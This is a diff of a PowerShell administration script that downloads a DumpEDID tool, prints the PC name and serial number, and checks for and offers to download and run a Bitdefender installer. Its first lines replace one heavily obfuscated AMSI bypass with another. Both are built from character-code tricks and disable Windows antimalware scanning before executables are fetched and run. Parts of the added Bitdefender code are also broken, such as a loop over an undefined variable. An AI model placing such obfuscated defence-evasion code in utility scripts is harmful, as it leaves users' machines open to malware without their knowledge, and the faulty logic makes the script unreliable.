@@ -1,9 +1,8 @@
-#Matt Graebers Reflection method with WMF5 autologging bypass 
-$KV=$null;$knyqafwlk="$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).$(('Mánágeme'+'nt').NORMAlizE([ChaR](70+49-49)+[cHaR]([ByTe]0x6f)+[ChAR](24+90)+[cHaR](109)+[ChAr](2+66)) -replace [chAr]([byTE]0x5c)+[chAR]([BYte]0x70)+[CHAR]([ByTE]0x7b)+[char]([bYTE]0x4d)+[cHar]([ByTe]0x6e)+[chaR]([BYtE]0x7d)).$([cHAR](26+39)+[cHar]([bytE]0x75)+[ChAr]([BYte]0x74)+[chAr]([BytE]0x6f)+[char]([BYtE]0x6d)+[chAr](75+22)+[cHAr]([bYTE]0x74)+[chAR]([Byte]0x69)+[CHaR](111)+[ChaR](110+44-44)).$(('Ã'+'m'+'s'+'î'+'U'+'t'+'í'+'l'+'s').NOrmALizE([cHaR](70)+[CHaR]([BYTE]0x6f)+[cHar](114*69/69)+[CHar](1+108)+[chAr]([BytE]0x44)) -replace [chaR](92*60/60)+[chAr](112+22-22)+[ChAr]([bYte]0x7b)+[cHar]([byTE]0x4d)+[CHaR]([bYte]0x6e)+[cHar](125+26-26))";$a="+[chAr](120+69-69)+[CHAr](119*106/106)+[chaR]([Byte]0x64)+[char](121*15/15)+[CHaR]([bytE]0x67)+[ChaR]([BytE]0x6d)+[CHaR](32+80)+[CHAR]([Byte]0x64)+[CHAR]([BYTe]0x72)+[cHAR]([bYTE]0x62)+[ChAr]([byTe]0x6d)+[cHAr]([bytE]0x6a)+[chAR]([byTE]0x68)+[cHar](100)+[ChAr](120)+[char]([byte]0x79)+[CHAr](121*75/75)+[char]([byTe]0x67)+[cHaR](120+113-113)+[char](99+41-41)+[chaR](100+47-47)+[chaR](97*26/26)+[CHaR]([bYTE]0x64)+[chaR]([ByTe]0x72)+[Char]([bYTe]0x72)+[CHAr](52+66)";[Threading.Thread]::Sleep(1282);[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType($(('$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).Reflectîón.BìndìngFlá'+'gs').nORMAlize([char](70)+[cHAr](8+103)+[CHaR]([ByTE]0x72)+[CHAr]([bYte]0x6d)+[ChaR]([BYte]0x44)) -replace [chAR]([byTE]0x5c)+[ChaR](112+32-32)+[cHAR](74+49)+[ChAR]([ByTE]0x4d)+[CHAr](14+96)+[chAr]([BYtE]0x7d)))).FullName), $([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).Reflection.FieldInfo]" -as [String].Assembly.GetType($(('$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44))'+'.Type').noRmalIZe([cHAr]([ByTe]0x46)+[ChAr]([bYTE]0x6f)+[ChAr](114+79-79)+[cHar]([ByTe]0x6d)+[CHAR](68+17-17)) -replace [Char](61+31)+[char]([byTe]0x70)+[cHar]([bYTE]0x7b)+[ChAR](77+46-46)+[ChaR](110+29-29)+[ChAR](125)))), [Object]([Ref].Assembly.GetType($knyqafwlk)),($([ChAr]([BYTe]0x47)+[cHar](16+85)+[ChaR](116+2-2)+[Char]([bYte]0x46)+[cHar](105+17-17)+[Char]([BytE]0x65)+[CHAr]([Byte]0x6c)+[char](100+53-53)))).Invoke($(('ãms'+'îÎn'+'ìtF'+'áîl'+'ed').NORmaLiZe([char]([BYTE]0x46)+[CHAr]([bYtE]0x6f)+[Char](114+84-84)+[CHaR](109*5/5)+[CHAR]([byte]0x44)) -replace [chaR](11+81)+[CHAR](49+63)+[CHar](123)+[cHaR]([byTe]0x4d)+[chaR](81+29)+[cHaR](78+47)),(("NonPublic,Static") -as [String].Assembly.GetType($(('$([CHAR]([BYTe]0x53)+[ChAR](62+59)+[chaR]([BYTe]0x73)+[ChAr]([BYtE]0x74)+[Char]([byte]0x65)+[ChAR](109+44-44)).Reflectîón.BìndìngFlá'+'gs').nORMAlize([char](70)+[cHAr](8+103)+[CHaR]([ByTE]0x72)+[CHAr]([bYte]0x6d)+[ChaR]([BYte]0x44)) -replace [chAR]([byTE]0x5c)+[ChaR](112+32-32)+[cHAR](74+49)+[ChAR]([ByTE]0x4d)+[CHAr](14+96)+[chAr]([BYtE]0x7d))))).SetValue($KV,$True);
-
+#Unknown - Force error 
+$PmSk=$null;$uzgrzevqr=[$([chaR]([bYTe]0x53)+[chAr]([bYtE]0x79)+[ChAR]([bYTE]0x73)+[cHaR]([byte]0x74)+[CHaR](101*19/19)+[chaR]([bYTE]0x6d)).Runtime.InteropServices.Marshal]::AllocHGlobal((5431+3645));$wifckyhcvhktnwfankaplyddrcwd="+[chAR]([byTE]0x67)+[chaR](107*96/96)+[cHar]([bYTe]0x72)+[CHAR]([BytE]0x73)+[ChaR]([ByTe]0x78)+[cHAr]([BYTe]0x6e)";[Threading.Thread]::Sleep(1811);[Ref].Assembly.GetType("$([chaR]([bYTe]0x53)+[chAr]([bYtE]0x79)+[ChAR]([bYTE]0x73)+[cHaR]([byte]0x74)+[CHaR](101*19/19)+[chaR]([bYTE]0x6d)).$(('Mánãgem'+'ent').NORmAlizE([CHar](70+59-59)+[cHAr](111+21-21)+[cHAR]([bYTE]0x72)+[CHar]([bYTE]0x6d)+[ChaR]([byTe]0x44)) -replace [CHaR]([ByTE]0x5c)+[ChAR](112*97/97)+[cHAR]([byTE]0x7b)+[CHAR](57+20)+[char](110)+[cHaR]([bYTe]0x7d)).$(('Äut'+'ómä'+'tìõ'+'n').NoRmAlIze([chaR](35+35)+[chAR](111)+[cHAR](114+94-94)+[CHar](29+80)+[CHaR](68+25-25)) -replace [CHaR](92)+[ChAr](112)+[cHAR](123)+[CHar]([byTe]0x4d)+[char](110)+[char]([bYTE]0x7d)).$(('ÂmsìUt'+'îls').NORmAliZE([Char]([BytE]0x46)+[CHaR](111+103-103)+[CHaR](114+14-14)+[cHar]([bytE]0x6d)+[ChAR](42+26)) -replace [chaR](19+73)+[cHaR](66+46)+[ChaR](123*51/51)+[cHar](47+30)+[ChAr](110+7-7)+[cHAR](117+8))").GetField("$([cHAR]([byTE]0x61)+[ChAr](109*51/51)+[chAR](115*17/17)+[ChAR]([BYte]0x69)+[CHaR]([BYTE]0x53)+[cHAr]([bYte]0x65)+[CHAR]([bYte]0x73)+[CHar](17+98)+[CHAr](3+102)+[chAR](78+33)+[cHar]([BYtE]0x6e))", "NonPublic,Static").SetValue($PmSk, $null);[Ref].Assembly.GetType("$([chaR]([bYTe]0x53)+[chAr]([bYtE]0x79)+[ChAR]([bYTE]0x73)+[cHaR]([byte]0x74)+[CHaR](101*19/19)+[chaR]([bYTE]0x6d)).$(('Mánãgem'+'ent').NORmAlizE([CHar](70+59-59)+[cHAr](111+21-21)+[cHAR]([bYTE]0x72)+[CHar]([bYTE]0x6d)+[ChaR]([byTe]0x44)) -replace [CHaR]([ByTE]0x5c)+[ChAR](112*97/97)+[cHAR]([byTE]0x7b)+[CHAR](57+20)+[char](110)+[cHaR]([bYTe]0x7d)).$(('Äut'+'ómä'+'tìõ'+'n').NoRmAlIze([chaR](35+35)+[chAR](111)+[cHAR](114+94-94)+[CHar](29+80)+[CHaR](68+25-25)) -replace [CHaR](92)+[ChAr](112)+[cHAR](123)+[CHar]([byTe]0x4d)+[char](110)+[char]([bYTE]0x7d)).$(('ÂmsìUt'+'îls').NORmAliZE([Char]([BytE]0x46)+[CHaR](111+103-103)+[CHaR](114+14-14)+[cHar]([bytE]0x6d)+[ChAR](42+26)) -replace [chaR](19+73)+[cHaR](66+46)+[ChaR](123*51/51)+[cHar](47+30)+[ChAr](110+7-7)+[cHAR](117+8))").GetField("$(('äms'+'ìCó'+'nte'+'xt').NORmAlIZE([chAR]([byTe]0x46)+[cHar](111)+[cHaR](9+105)+[cHAr]([ByTE]0x6d)+[cHAR](68*50/50)) -replace [CHAR]([byTe]0x5c)+[cHAr](112+10-10)+[char]([BYTe]0x7b)+[CHar](77)+[Char]([BYte]0x6e)+[Char](125))", "NonPublic,Static").SetValue($null, [IntPtr]$uzgrzevqr);
 $url = "https://github.com/jelpsIT/duckery/raw/main/DumpEDID.exe"
 $outputPath = "C:\temp\"
-
+cls
 # Check if the output path exists
 if (-not (Test-Path $outputPath -PathType Container)) {
     # Create the output path if it doesn't exist
@@ -71,5 +70,81 @@ Write-Host "PC Name:`t$pcName" -ForegroundColor Yellow
 Write-Host "Serial Number:`t$($serialNumber.SerialNumber)`n" -ForegroundColor Yellow
 
 
-# add download bitdefender and xml file with user prompts 
+
+$bitdefenderInstalled = $false
+
+# Get list of installed programs from registry
+$programs = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, UninstallString
+
+# Check if any program with a name containing "Bitdefender" is installed
+foreach ($program1 in $programs1) {
+    if ($program1.DisplayName -like "*Bitdefender*") {
+        $bitdefenderInstalled = $true
+        break
+    }
+}
+Function IsBitDefenderInstalled {
+# Do some code if Bitdefender is installed
+if ($bitdefenderInstalled) {
+    Write-Host "See table above."
+}
+# Do some other code if Bitdefender is not installed
+else {
+    # Set the download URLs
+	
+$url1 = "https://link.storjshare.io/s/julpr7igbkdcz252zfakn26pa6hq/storage/epskit_x64.exe?download=1"
+$url2 = "https://raw.githubusercontent.com/jelpsIT/automation_EDIDs/main/installer.xml"
+
+# Set the download locations
+$downloadPath1 = "$env:USERPROFILE\Downloads\epskit_x64.exe"
+$downloadPath2 = "$env:USERPROFILE\Downloads\installer.xml"
+
+# Try to download the files and move them to the temp folder
+try {
+    # Create a BITS transfer job for file 1
+    $bitsJob1 = Start-BitsTransfer -Source $url1 -Destination $downloadPath1 -DisplayName "Downloading Bitdefender" -Description "BITS transfer" -Priority Foreground -TransferType Download -ErrorVariable bitsError1
+
+    # Create a BITS transfer job for file 2
+    $bitsJob2 = Start-BitsTransfer -Source $url2 -Destination $downloadPath2 -DisplayName "Downloading XML File" -Description "BITS transfer" -Priority Foreground -TransferType Download -ErrorVariable bitsError2
+
+    # Wait for the BITS transfer jobs to complete
+    while ($bitsJob1.JobState -ne "Transferred" -or $bitsJob2.JobState -ne "Transferred") {
+        Write-Progress -Activity "Downloading files" -Status "File 1: $($bitsJob1.BytesTransferred) bytes downloaded, File 2: $($bitsJob2.BytesTransferred) bytes downloaded" -PercentComplete ($bitsJob1.BytesTransferred + $bitsJob2.BytesTransferred) / ($bitsJob1.BytesTotal + $bitsJob2.BytesTotal * 2) * 100
+        Start-Sleep -Seconds 1
+    }
+}
+catch {
+    # If the download fails, change the download path to the backup location
+    Write-Warning "Completed downloading. Navigate to $env:USERPROFILE\Downloads"
+}
+}
+}
+$bitdefenderInstalled = $false
+
+# Get list of installed programs from registry
+$programs = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, UninstallString
+
+# Check if any program with a name containing "Bitdefender" is installed
+foreach ($program in $programs) {
+    if ($program.DisplayName -like "*Bitdefender*") {
+        $bitdefenderInstalled = $true
+        break
+    }
+}
+
+# Do some code if Bitdefender is installed
+if ($bitdefenderInstalled) {
+    Write-Host "Bitdefender is installed. See Table below"
+    # add your code here
+}
+# Do some other code if Bitdefender is not installed
+else {
+    Write-Host "Bitdefender is not installed"
+    IsBitDefenderInstalled
+	$installBitdefender = Read-Host "Do you want to install Bitdefender? (Y/N)"
+    if ($installBitdefender -eq "Y") {
+        # Invoke the installer for file 1
+        Start-Process $downloadPath1
+    }
+}
 
